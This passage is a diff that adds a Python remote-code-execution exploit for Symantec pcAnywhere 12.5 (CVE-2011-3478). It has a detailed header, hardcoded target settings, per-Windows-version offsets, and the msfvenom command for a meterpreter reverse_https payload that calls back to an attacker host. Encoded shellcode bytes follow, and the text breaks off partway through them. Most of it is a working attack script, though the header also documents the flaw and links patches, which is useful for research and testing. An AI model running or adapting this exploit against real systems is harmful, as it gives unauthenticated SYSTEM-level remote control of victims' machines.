@@ -1,0 +1,192 @@
+#!/usr/bin/python
+
+################################################################
+# Exploit Title: Symantec pcAnywhere v12.5.0 Windows x86 RCE
+# Date: 2015-10-31
+# Exploit Author: Tomislav Paskalev
+# Vendor Homepage: https://www.symantec.com/
+# Software Link: http://esdownload.symantec.com/akdlm/CD/MTV/pcAnywhere_12_5_MarketingTrialware.exe
+#   Version: Symantec pcAnywhere v12.5.0 Build 442 (Trial)
+# Vulnerable Software:
+#   Symantec pcAnywhere 12.5.x through 12.5.3
+#   Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka 12.6.x)
+# Tested on:
+#   Symantec pcAnywhere v12.5.0 Build 442 (Trial)
+#   --------------------------------------------
+#   Microsoft Windows Vista Ultimate SP1 x86 EN
+#   Microsoft Windows Vista Ultimate SP2 x86 EN
+#   Microsoft Windows 2008 Enterprise SP2 x86 EN
+#   Microsoft Windows 7 Professional SP1 x86 EN
+#   Microsoft Windows 7 Ultimate SP1 x86 EN
+# CVE ID: 2011-3478
+# OSVDB-ID: 78532
+################################################################
+# Vulnerability description:
+#   The application's module used for handling incoming connections
+#   (awhost32.exe) contains a flaw. When handling authentication
+#   requests, the vulnerable process copies user provided input
+#   to a fixed length buffer without performing a length check.
+#   A remote unauthenticated attacker can exploit this vulnerability
+#   to cause a buffer overflow and execute arbitrary code in the
+#   context of the exploited application (installed as a service
+#   by default, i.e. with "NT AUTHORITY\SYSTEM" privileges).
+################################################################
+# Target application notes:
+#   - the application processes one login attempt at a time
+#     (i.e. multiple parallel login requests are not possible)
+#   - available modules (interesting exploit wise):
+#     Name         | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
+#    -------------------------------------------------------------
+#     awhost32.exe | False  | False   | False |  False   | False
+#     ijl20.dll    | False  | False   | False |  False   | False
+#     IMPLODE.DLL  | False  | False   | False |  False   | False
+#    -------------------------------------------------------------
+#   - supported Windows x86 operating systems (pcAnywhere v12.5)
+#       - Windows 2000
+#       - Windows 2003 Server
+#       - Windows 2008 Server
+#       - Windows XP
+#       - Windows Vista
+#       - Windows 7
+################################################################
+# Exploit notes:
+#   - bad characters: "\x00"
+#   - Windows Vista, Windows 2008 Server, Windows 7
+#     - after a shellcode execution event occurs, the
+#       application does not crash and remains fully functional
+#       - one successful shellcode execution event has a low
+#         success rate (applies to all OSes)
+#         - in order to achieve an overall more reliable exploit,
+#           multiple shellcode executions need to be performed
+#           (until the shellcode is successfully executed)
+#           - brute force is a feasible method 
+#             - multiple parallel brute force attacks are not possible
+#   - multiple valid offsets are available (i.e. not just the
+#     ones tested)
+################################################################
+# Test notes:
+#   - all tested OSes
+#     - clean default installations
+#   - all OS specific statistics referenced in the exploit are
+#     based on the test results of 10 attempts per tested offset
+#     - all attempts were performed after a system reboot (VM)
+#     - the provided test results should be taken only as a rough guide
+#       - in practice it might occur that the number of attempts
+#         needed to achieve successful exploitation is (much)
+#         higher than the maximum value contained in the test
+#         results, or that the exploit does not succeed at all
+#         - other (untested) offsets might provide better results
+#   - not letting the OS and application load fully/properly before
+#     starting the exploit may lead to failed exploitation (this
+#     observation was made during the testing of the exploit and
+#     applies mostly to Windows 7)
+################################################################
+# Patch:
+#   https://support.symantec.com/en_US/article.TECH179526.html
+#   https://support.norton.com/sp/en/us/home/current/solutions/v78694006_EndUserProfile_en_us
+################################################################
+# Thanks to:
+#   Tal zeltzer (discovered the vulnerability)
+#   S2 Crew (Python PoC)
+################################################################
+# In memoriam:
+#   msfpayload | msfencode  [2005 - 2015]
+################################################################
+# References:
+#   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478
+#   http://www.zerodayinitiative.com/advisories/ZDI-12-018/
+#   https://www.exploit-db.com/exploits/19407/
+################################################################
+
+
+import socket
+import time
+import struct
+import string
+import sys
+
+
+
+
+################################
+###  HARDCODED TARGET INFO   ###
+################################
+
+
+# target server info
+# >>> MODIFY THIS >>>
+targetServer = "192.168.80.227"
+targetPort   = 5631
+
+
+# Supported operating systems
+vistaUltSP1  = {
+    'Version': 'Microsoft Windows Vista Ultimate SP1 x86 EN',
+    'Offset': 0x03e60000,
+    'PasswordStringLength': 3500,
+    'TestAttempts': [8, 62, 35, 13, 8, 7, 11, 23, 8, 10]
+};
+vistaUltSP2  = {
+    'Version': 'Microsoft Windows Vista Ultimate SP2 x86 EN',
+    'Offset': 0x03e60000,
+    'PasswordStringLength': 3500,
+    'TestAttempts': [16, 27, 13, 17, 4, 13, 7, 9, 5, 16]
+};
+s2k8EntSP2   = {
+    'Version': 'Microsoft Windows 2008 Enterprise SP2 x86 EN',
+    'Offset': 0x03dd0000,
+    'PasswordStringLength': 3500,
+    'TestAttempts': [25, 5, 14, 18, 66, 7, 8, 4, 4, 24]
+};
+sevenProSP1  = {
+    'Version': 'Microsoft Windows 7 Professional SP1 x86 EN',
+    'Offset': 0x03a70000,
+    'PasswordStringLength': 3500,
+    'TestAttempts': [188, 65, 25, 191, 268, 61, 127, 136, 18, 98]
+};
+sevenUltSP1  = {
+    'Version': 'Microsoft Windows 7 Ultimate SP1 x86 EN',
+    'Offset': 0x03fa0000,
+    'PasswordStringLength': 3500,
+    'TestAttempts': [23, 49, 98, 28, 4, 31, 4, 42, 50, 42]
+};
+
+
+# target server OS
+# >>> MODIFY THIS >>>
+#OSdictionary = vistaUltSP1
+#OSdictionary = vistaUltSP2
+#OSdictionary = s2k8EntSP2
+#OSdictionary = sevenProSP1
+OSdictionary = sevenUltSP1
+
+
+# timeout values
+shellcodeExecutionTimeout = 30
+
+
+# client-server handshake
+initialisationSequence = "\x00\x00\x00\x00"
+handshakeSequence      = "\x0d\x06\xfe"
+
+
+# username string
+usernameString         = "U" * 175
+
+
+# shellcode
+# available shellcode space: 1289 bytes
+# shellcode generated with Metasploit Framework Version: 4.11.4-2015090201 (Kali 2.0)
+# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=192.168.80.223 LPORT=443 EXITFUNC=seh -e x86/shikata_ga_nai -b '\x00' -f python -v shellcode
+# >>> MODIFY THIS >>>
+shellcode =  ""
+shellcode += "\xda\xd3\xd9\x74\x24\xf4\xbf\x2c\x46\x39\x97\x5d"
+shellcode += "\x33\xc9\xb1\x87\x83\xed\xfc\x31\x7d\x14\x03\x7d"
+shellcode += "\x38\xa4\xcc\x6b\xa8\xaa\x2f\x94\x28\xcb\xa6\x71"
+shellcode += "\x19\xcb\xdd\xf2\x09\xfb\x96\x57\xa5\x70\xfa\x43"
+shellcode += "\x3e\xf4\xd3\x64\xf7\xb3\x05\x4a\x08\xef\x76\xcd"
+shellcode += "\x8a\xf2\xaa\x2d\xb3\x3c\xbf\x2c\xf4\x21\x32\x7c"
+shellcode += "\xad\x2e\xe1\x91\xda\x7b\x3a\x19\x90\x6a\x3a\xfe"
+shellcode += "\x60\x8c\x6b\x51\xfb\xd7\xab\x53\x28\x6c\xe2\x4b"
+shellcode += "\x2d\x49\xbc\xe0\x85\x25\x3f\x21\xd4\xc6\xec\x0c"
+shellcod
